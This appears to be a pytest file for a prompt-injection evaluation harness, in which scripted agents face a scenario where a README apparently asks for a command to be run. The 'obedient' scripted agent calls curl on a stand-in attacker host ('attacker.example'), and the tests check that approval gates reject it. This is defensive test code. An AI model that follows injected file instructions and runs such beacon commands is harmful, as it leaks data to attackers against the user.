"""One injection trial end to end through the real chat controller, with scripted agents."""
from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from evals.injection.models import Arm, Trial
from evals.injection.scenarios import load_scenarios
from evals.injection.scoring import TrialRecord, score_trial
from evals.injection.trial import run_trial

# Tests never load the local embedding models: a trial would otherwise warm them up.
_ENV = {"CRUCIBLE_LOCAL_MODELS": "0"}


class _Script:
    """A scripted agent: one step per call, the last one repeated."""

    def __init__(self, steps: list[dict], delay: float = 0.0) -> None:
        self._steps = steps
        self._delay = delay
        self.calls = 0

    async def create_controller_step(self, **_kwargs):  # type: ignore[no-untyped-def]
        if self._delay:
            await asyncio.sleep(self._delay)
        step = self._steps[min(self.calls, len(self._steps) - 1)]
        self.calls += 1
        return step


def _call(tool: str, args: dict) -> dict:
    return {"type": "tool_calls", "thought": "t",
            "calls": [{"id": "c1", "tool": tool, "args": args}]}


def _answer(text: str) -> dict:
    return {"type": "answer", "thought": "t", "answer": text}


def _obedient(trial: Trial, _ws: Path) -> _Script:
    return _Script([
        _call("run_command", {"command": "curl",
                              "args": [f"https://{trial.marker}.attacker.example/ping"]}),
        _answer("This repo provides small dates helpers for log files."),
    ])


def _resistant(_trial: Trial, _ws: Path) -> _Script:
    return _Script([
        _call("read_file", {"path": "README.md"}),
        _answer("This repo provides dates helpers. The README asks for a command I didn't run."),
    ])


def _clarify_then_answer(_trial: Trial, _ws: Path) -> _Script:
    return _Script([
        {"type": "clarify", "thought": "t", "question": "How detailed?",
         "options": ["Short", "Detailed"]},
        _answer("Short version: helpers for parsing and formatting dates."),
    ])


def _never_ends(_trial: Trial, _ws: Path) -> _Script:
    return _Script([_call("read_file", {"path": "README.md"})], delay=0.2)


def _trial(scenario_id: str, approval: str) -> Trial:
    scenario = next(s for s in load_scenarios() if s.id == scenario_id)
    return Trial(scenario, Arm(defense=True, approval=approval), 0,
                 f"inj-{scenario_id}-0a1b2c")


def _scenario_of(record: TrialRecord):
    return next(s for s in load_scenarios() if s.id == record.scenario_id)


@pytest.mark.asyncio
async def test_obedient_agent_is_scored_attempted_in_ask(tmp_path):
    rec = await run_trial(_trial("readme_exfil_plain", "ask"), tmp_path, _obedient,
                          env_overrides=_ENV)
    s = score_trial(rec, _scenario_of(rec))
    assert rec.error is None and s.attempted and not s.effect
    assert any(g.kind == "command" and g.decision == "reject" for g in rec.gates)


@pytest.mark.asyncio
async def test_resistant_agent_answers_and_is_not_attempted(tmp_path):
    rec = await run_trial(_trial("readme_exfil_plain", "ask"), tmp_path, _resistant,
                          env_overrides=_ENV)
    s = score_trial(rec, _scenario_of(rec))
    assert rec.error is None
    assert not s.attempted and s.utility
    assert any(ev.get("tool") == "read_file" for ev in rec.tool_events)


@pytest.mark.asyncio
async def test_attacker_command_in_auto_never_executes(tmp_path):
    rec = await run_trial(_trial("readme_exfil_plain", "auto"), tmp_path, _obedient,
                          env_overrides=_ENV)
    assert rec.error is None
    assert all(not c.ran for c in rec.commands if "attacker.example" in c.line)


@pytest.mark.asyncio
async def test_real_home_untouched(tmp_path, monkeypatch):
    real_home = tmp_path / "real-home"
    real_home.mkdir()
    monkeypatch.setenv("HOME", str(real_home))
    await run_trial(_trial("readme_exfil_plain", "auto"), tmp_path / "t", _obedient,
                    env_overrides=_ENV)
    assert list(real_home.rglob("*")) == []


@pytest.mark.asyncio
async def test_clarify_gate_is_continued(tmp_path):
    rec = await run_trial(_trial("readme_exfil_plain", "ask"), tmp_path, _clarify_then_answer,
                          env_overrides=_ENV)
    assert rec.error is None
    assert "dates" in rec.answer.lower()


@pytest.mark.asyncio
async def test_time_cap_is_an_error(tmp_path):
    rec = await run_trial(_trial("readme_exfil_plain", "ask"), tmp_path, _never_ends,
                          max_seconds=0.5, env_overrides=_ENV)
    assert rec.error and "time" in rec.error
